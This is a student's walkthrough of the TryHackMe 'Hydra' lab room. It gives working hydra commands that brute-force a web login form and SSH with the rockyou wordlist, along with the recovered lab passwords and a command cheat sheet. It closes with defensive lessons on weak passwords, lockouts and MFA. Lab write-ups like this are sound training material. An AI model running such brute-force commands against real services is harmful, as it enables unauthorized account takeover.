# Hydra (TryHackMe) — Student Writeup

- **Platform:** TryHackMe  
- **Room:** Hydra  
- **Category:** Password Attacks  
- **Difficulty:** Easy  
- **Approach:** Option A – Student-style walkthrough

---

## 1. Room Goal & Lab Setup

**Goal:**  
Practice using `hydra` to brute-force:

1. A **web login form** to discover the password for user `molly` (Flag 1).
2. The **SSH service** on the same target to recover `molly`'s SSH password (Flag 2).

**Environment used:**

- My own **Kali Linux VM** (running in VirtualBox), connected to the TryHackMe network via **OpenVPN**.
- Default Kali tools:
  - `hydra`
  - `rockyou.txt` wordlist (`/usr/share/wordlists/rockyou.txt`)

**Connection reminder:**

I had to:

1. Download my THM `.ovpn` connection pack.
2. Put it in my Kali VM (in `~/Downloads`).
3. Connect with:

   ```bash
   sudo openvpn ~/Downloads/download.ovpn
   ```

   Once I saw `Initialization Sequence Completed`, I knew my VM was on the THM network.

---

## 2. Task 1 — Understanding Hydra

Hydra is an **online password brute-forcing tool**.  
Instead of cracking offline hashes, it talks directly to services like:

- `ssh`
- `ftp`
- web logins (`http-post-form`, `http-get-form`)
- and many more

Basic pattern I used mentally:

```bash
hydra [user options] [password options] [target] [service or module]
```

Examples:

- FTP:  
  ```bash
  hydra -l user -P passlist.txt ftp://TARGET_IP
  ```
- SSH:  
  ```bash
  hydra -l user -P passlist.txt TARGET_IP ssh
  ```

---

## 3. Task 2 — Brute Forcing the Web Login (Flag 1)

### 3.1. Explore the Web App

The room told me to browse to the target:

```text
http://10.66.148.23
```

The page showed a simple **login form** with:

- `username` field
- `password` field

TryHackMe’s task instructions also said:

- The login page is `/` (root URL).
- The failure string includes the word **`incorrect`**.

So Hydra's `http-post-form` syntax from the task looked like:

```bash
hydra -l <username> -P <wordlist> 10.66.148.23   http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### 3.2. Choose the wordlist

I used the classic `rockyou.txt` that comes with Kali.

If it is still compressed, it needs to be unzipped once:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

### 3.3. Hydra command for the web form

The room told me the target user is **`molly`**, so I ran:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.148.23   http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Key pieces:

- `-l molly`  
  Single username: `molly`.

- `-P /usr/share/wordlists/rockyou.txt`  
  Use the `rockyou.txt` password list.

- `10.66.148.23`  
  Target IP (THM machine).

- `http-post-form` module:

  - `"/:username=^USER^&password=^PASS^:F=incorrect"`

    - `/` → the login endpoint is at the site root.
    - `username=^USER^&password=^PASS^` → tells Hydra which parameters to swap with usernames and passwords.
    - `F=incorrect` → if the response contains `incorrect`, Hydra treats it as a failed attempt.

After some time, Hydra returned the **valid web password**:

- **User:** `molly`  
- **Password:** `sunshine`

I then logged into the web page with:

- Username: `molly`  
- Password: `sunshine`

The page displayed **Flag 1**.

---

## 4. Task 3 — Brute Forcing SSH (Flag 2)

The second question in the room asks me to:

> Use Hydra to bruteforce `molly`'s SSH password. What is flag 2?

### 4.1. Hydra command for SSH

Here the syntax is simpler because SSH already has a built-in module:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.148.23 ssh
```

Explanation:

- `-l molly` → username is `molly`
- `-P /usr/share/wordlists/rockyou.txt` → same wordlist
- `10.66.148.23` → THM target IP
- `ssh` → use the SSH module

### 4.2. Result

Hydra output (important line):

```text
[22][ssh] host: 10.66.148.23   login: molly   password: butterfly
```

So the valid SSH credentials were:

- **User:** `molly`  
- **Password:** `butterfly`

---

### 4.3. SSH login and Flag 2

Next, I used those credentials to log in:

```bash
ssh molly@10.66.148.23
```

When prompted, I entered:

```text
butterfly
```

Once connected to the box as `molly`, I listed the current directory and/or checked the home folder and found **Flag 2** in one of the files shown right after login.

---

## 5. Hydra vs. Password Security — Lessons Learned

From this room I reinforced:

1. **Weak, common passwords are dangerous.**
   - Both `sunshine` and `butterfly` are in common wordlists like `rockyou.txt`.
   - Any online account using these is at high risk of being brute-forced.

2. **Username + password reuse is a major issue.**
   - Same user (`molly`) reused across web and SSH.
   - Once an attacker knows a username, they can try it across multiple services.

3. **Login error messages matter.**
   - Hydra needs a clear failure string (here, `incorrect`).
   - Overly specific error messages (e.g., “username not found” vs “password incorrect”) can also help attackers.

4. **Online brute forcing can be noisy.**
   - In a real environment, large numbers of failed attempts would trigger:
     - account lockouts
     - SIEM alerts
     - firewall or IDS rules

5. **Defensive takeaways:**
   - Enforce strong passwords and password managers.
   - Use account lockout or throttling for repeated failures.
   - Separate credentials between services.
   - Add MFA where possible.

---

## 6. Commands Summary (Cheat Sheet)

### Connect to TryHackMe VPN

```bash
sudo openvpn ~/Downloads/download.ovpn
```

---

### Prepare wordlist (if needed)

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

### Web login brute force (Flag 1)

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.148.23   http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

- Result: `molly : sunshine`

---

### SSH brute force (Flag 2)

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.66.148.23 ssh
```

- Result: `molly : butterfly`

---

### SSH login

```bash
ssh molly@10.66.148.23
```

---

## 7. Reflection

This room tied together:

- Reading task instructions carefully.
- Translating a web login into Hydra’s `http-post-form` syntax.
- Reusing the same tool (`hydra`) against two different services (web and SSH).
- Troubleshooting environment issues (VPN, wordlist path, etc.).

It also aligns nicely with **CompTIA PenTest+** objectives around:

- Gathering credentials
- Password attacks
- Exploiting weak authentication

This writeup is meant as a **learning log** for my GitHub and future review.
